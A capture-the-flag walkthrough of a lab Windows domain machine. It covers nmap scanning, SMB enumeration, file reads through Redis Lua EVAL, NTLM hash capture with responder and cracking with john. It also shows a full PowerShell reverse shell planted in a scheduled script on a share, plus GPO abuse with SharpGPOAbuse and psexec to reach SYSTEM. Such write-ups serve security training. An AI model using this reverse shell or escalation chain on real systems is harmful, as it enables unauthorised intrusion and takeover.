- ### Operating System: Windows <img src="/img/02/00.png" alt="drawing" width="30"/>
- ### Difficulty: Medium
- ### Machine IP : 10.10.214.82

#  ↘️   ⬇️   ↙️
## Step 1 : Scanning Target .

```

root@kali:~/thm/vulnNet:active# nmap -sV -sC -p- -Pn -oN vulnnet-nmap.txt 10.10.214.82

# Nmap 7.92 scan initiated Tue Nov  9 05:07:26 2021 as: nmap -sV -sC -p- -Pn -oN vulnnet-nmap.txt 10.10.214.82
Nmap scan report for 10.10.214.82
Host is up (0.34s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -5s
| smb2-time: 
|   date: 2021-11-09T03:22:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  9 05:22:46 2021 -- 1 IP address (1 host up) scanned in 920.05 seconds

```
___ 

#  ↘️   ⬇️   ↙️
## Step 2 : ( **SMB** **Enumeration** ) 

```
root@kali:~/thm/vulnNet:active# smbclient -N -L 10.10.214.82
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```
<br />
* As we can see we found nothing in SMB with no Credentials

```
root@kali:~/thm/vulnNet:active# crackmapexec smb 10.10.214.82

SMB   10.10.214.82    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```
**NOTES:** As we can see in the second step we found the donmain name 

___

#  ↘️   ⬇️   ↙️
## Step 3 : ( **_Redis_** )

- **Note:** If You Don't know what Redis is [`What is Redis and What Does It Do?`](https://www.youtube.com/watch?v=8A_iNFRP0F4)
- **Note 2:** Install redis tools in linux `apt-get install redis-tools ` 
- **Note 3:** A usefull resources online [`HackTricks`](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

## Connecting to radis ➡️
### root@kali:~/thm/vulnNet:active# redis-cli -h 10.10.214.82

+ ## root@kali:~/thm/vulnNet:active# 10.10.214.82:6379> INFO


```
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:1328
run_id:c1f0081a27e1ebe4247867354edfcc95c9bf23b7
tcp_port:6379
uptime_in_seconds:3441
uptime_in_days:0
hz:10
lru_clock:9040602
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:953088
used_memory_human:930.75K
used_memory_rss:919544
used_memory_peak:977576
used_memory_peak_human:954.66K
used_memory_lua:36864
mem_fragmentation_ratio:0.96
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1636427113
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:5
total_commands_processed:2
instantaneous_ops_per_sec:0
total_net_input_bytes:58
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.33
used_cpu_user:0.09
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace

```

- **Note 4:** For saving Article Size I Will leave only the wanted Information `CONFIG GET dir ` this what we need but Do this and read all configration `CONFIG GET *` the directory inforation will be in line `104`

+ ## root@kali:~/thm/vulnNet:active# 10.10.214.82:6379> CONFIG GET dir
## `"C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"`

- **Note 5:** Now we have 2 Important informations we know the first username and where's Redis 

- **Note 6:** At this point thinking outside the box with researching you gonna find that Redis can execute sandboxed Lua scripts through the “EVAL” command. dofile() is a command that can be used to enumerate files and directories. dofile() is allowed by the sandbox in older Redis versions.

## Getting First Flag  :

- root@kali:~/thm/vulnNet:active# redis-cli -h 10.10.214.82 EVAL "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0 
>error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near 'I'm the Flag 😂️' 

> >![](/img/02/01.png)

## Getting NTLM Hash :

- We will make redis connect to our local machine using responder wich captures serice hash .

>root@kali:~/thm/vulnNet:active# responder -I tun0 

>> Wait for the connection 😉️

![](/img/02/02.png)

- At this point we need to crack the hash using hashcat or john the ripper

> root@kali:~/thm/vulnNet:active# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
>>Using default input encoding: UTF-8
>>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
>>Press 'q' or Ctrl-C to abort, almost any other key for status
>>{** ** ** ** ** ** ** **}  (enterprise-security)
>>1g 0:00:00:06 DONE (2021-11-09 07:01) 0.1666g/s 668997p/s 668997c/s 668997C/s 
>>Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
>>Session completed

---

#  ↘️   ⬇️   ↙️
## Step 4 : ( **_Back 2 SMB_** )

- 
-- root@kali:~/thm/vulnNet:active# smbclient -L 10.10.214.82 -U "enterprise-security"

>Enter WORKGROUP\enterprise-security's password: 

>        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

>SMB1 disabled -- no workgroup available

- I see It Interesting `Enterprise-Share` So ....


```
root@kali:~/thm/vulnNet:active# smbclient \\\\10.10.214.82\\Enterprise-Share -U "enterprise-security"
Enter WORKGROUP\enterprise-security's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Feb 24 00:45:41 2021
  ..                                  D        0  Wed Feb 24 00:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 02:33:18 2021

                9558271 blocks of size 4096. 5135876 blocks available

smb: \> get PurgeIrrelevantData_1826.ps1 

getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
---
```
root@kali:~/thm/vulnNet:active# cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue

```

- I know what come in your mind we will change this powershell script with our reverse shell and see what will happen

```
$client = New-Object System.Net.Sockets.TCPClient("MY - IP",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

- **BooM We Got Our Shell😈️**
- **I will put also powerview.ps1 -- Sharphound.ps1** 

---

#  ↘️   ⬇️   ↙️
## Step 5 : ( **_Server Enumeration_** )

- Starting PowerView ...

```
PS C:\Enterprise-Share>powershell.exe
PS C:\Enterprise-Share> Import-Module C:\Enterprise-Share\powerview.ps1
PS C:\Enterprise-Share> Import-Module C:\Enterprise-Share\sharphound.ps1
```

- ### From enumrating with powerview and Bloodhound ( We knew it is Group policy Object that will lead us to Administrator privilege )

- **_Enumrate BloodHound patiently_**

- **Don't Forget to transfer the zip file of BloodHound**

![](/img/02/03.png)
- Enterprise-Security

![](/img/02/04.png)
- Security-pol-vn 

- **Then you will get this tool called SharpGPOAbuse.exe**

```
C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```
![](/img/02/05.png)

- Nearly To The last step update Group Policy Object

C:\Enterprise-Share> gpuodate /force

![](/img/02/06.png)

- Now we need to get a shell with admin rights so we will use impackt-psexe

```
root@kali:~/thm/vulnNet:active# impacket-psexec enterprise-security@10.10.90.179
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.90.179.....
[*] Found writable share ADMIN$
[*] Uploading file kmOhrycO.exe
[*] Opening SVCManager on 10.10.90.179.....
[*] Creating service KOJm on 10.10.90.179.....
[*] Starting service KOJm.....
[!] Press help for extra shell commands
 
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

![](/img/02/07.png)

- Now we get the last flag 

![](/img/02/08.png)

# C:\Users\Administrator\Desktop>^C
# root@kali:~/thm/vulnNet:active# init 0







